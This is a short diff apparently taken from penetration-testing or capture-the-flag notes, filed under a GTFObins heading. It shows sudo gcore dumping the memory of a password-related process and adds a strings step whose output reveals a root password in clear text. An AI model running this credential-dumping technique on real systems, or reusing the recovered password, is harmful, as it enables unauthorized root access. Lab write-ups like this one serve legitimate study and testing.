@@ -92,6 +92,10 @@ root       513  0.0  0.0   2276    72 ?        Ss   09:16   0:00 /usr/bin/passwo
 # GTFObins
 sudo gcore $PID
 sudo -u root /usr/bin/gcore -a -o <outputfile> <pid>
+strings <outputfile>
+001 Password: root:
+ClogKingpinInning731
+
 
 ```
 
